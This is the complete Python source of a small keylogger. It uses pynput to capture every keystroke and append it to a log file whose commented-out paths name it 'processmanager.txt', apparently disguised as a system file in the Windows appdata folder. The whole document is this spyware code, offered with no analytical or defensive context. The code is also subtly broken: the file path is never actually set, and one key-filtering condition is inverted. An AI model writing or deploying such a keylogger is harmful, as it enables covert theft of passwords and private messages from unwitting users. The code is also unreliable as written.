import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = os.environ['appdata'] + '\\processmanager.txt' #- Windows Environment
#path = 'processmanager.txt' #- Linux Environment

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            if k.find('enter') > 0:
                f.write('\n')
            if k.find('shift') > 0:
                f.write(' Shift ')
            if k.find('space') > 0:
                f.write(' ')
            if k.find('caps_lock') > 0:
                f.write(' caps_lock')
            elif k.find('Key'):
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()